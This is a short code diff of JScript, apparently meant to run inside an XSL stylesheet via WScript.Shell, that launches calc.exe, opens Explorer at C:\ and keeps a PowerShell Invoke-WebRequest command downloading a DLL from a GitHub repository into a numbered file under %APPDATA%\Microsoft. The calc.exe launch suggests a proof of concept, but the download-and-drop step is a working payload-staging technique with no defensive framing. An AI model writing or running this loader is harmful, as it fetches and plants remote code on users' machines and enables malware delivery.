@@ -13,10 +13,8 @@
 
 		    // Build path to %APPDATA%\Microsoft\7346832764233279.dll
 	            var shell = new ActiveXObject("WScript.Shell");
-	            var env = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\7346832764233279.dll");
-	
-	            var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";
 		    shell.Run('calc.exe');
+		    var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');
 
 	            try {
 			var ps = "powershell -Command \"Invoke-WebRequest 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll' -OutFile '$env:APPDATA\\Microsoft\\7346832764233279.dll'\"";
